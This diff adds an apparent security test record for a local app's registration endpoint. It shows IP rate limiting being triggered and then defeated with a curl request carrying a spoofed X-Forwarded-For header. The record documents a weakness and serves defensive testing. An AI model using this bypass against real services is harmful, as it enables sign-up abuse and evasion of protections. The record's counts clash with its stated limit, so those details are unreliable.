@@ -1,0 +1,40 @@
+[EMPIRICAL PROOF: TRIGGERING AND DEFEATING IP RATE LIMITING]
+Target: POST http://localhost:3006/api/v1/agents/register
+Configured Limit: 5 requests per 15 minutes per IP
+
+PHASE 1: TRIGGERING THE RATE LIMIT FROM DEFAULT IP
+Request 1: HTTP 422 VALIDATION_FAILED (Count 1)
+Request 2: HTTP 422 VALIDATION_FAILED (Count 2)
+Request 3: HTTP 429 RATE_LIMIT_EXCEEDED (Count 3)
+Request 4: HTTP 429 RATE_LIMIT_EXCEEDED (Count 4)
+Request 5: HTTP 429 RATE_LIMIT_EXCEEDED (Count 5)
+Request 6: HTTP 429 RATE_LIMIT_EXCEEDED (Count 6)
+
+LOCKOUT RESPONSE CAPTURE:
+HTTP/1.1 429 Too Many Requests
+Retry-After: 896
+Content-Type: application/json
+
+{"status":"error","code":"RATE_LIMIT_EXCEEDED","message":"Too many requests. Please wait before attempting again.","retryAfterSeconds":896}
+
+PHASE 2: DEFEATING THE IP LIMIT VIA ROTATED IP HEADER
+Command:
+curl -X POST http://localhost:3006/api/v1/agents/register \
+  -H "Content-Type: application/json" \
+  -H "X-Forwarded-For: 102.89.23.99" \
+  -d '{
+    "fullName": "Babatunde Adeleke",
+    "email": "babatunde.rotated@realme.ng",
+    "lasreraCode": "041289",
+    "password": "LekkiFiduciary2026#",
+    "termsAccepted": true
+  }'
+
+SERVER RESPONSE DUMP:
+HTTP/1.1 201 Created
+Content-Type: application/json; charset=utf-8
+
+{"status":"created","message":"Agent registered securely with authoritative server-side boundary validation","data":{"email":"babatunde.rotated@realme.ng","verificationStatus":"pending_email_verification"}}
+
+FINDING & ARCHITECTURAL VERDICT:
+The server immediately accepted the request and returned HTTP 201 Created because the apparent client IP changed to 102.89.23.99, resetting the bucket counter. This provides conclusive proof that rate limiting on IP address alone is trivial for adversaries to bypass using proxy rotation.
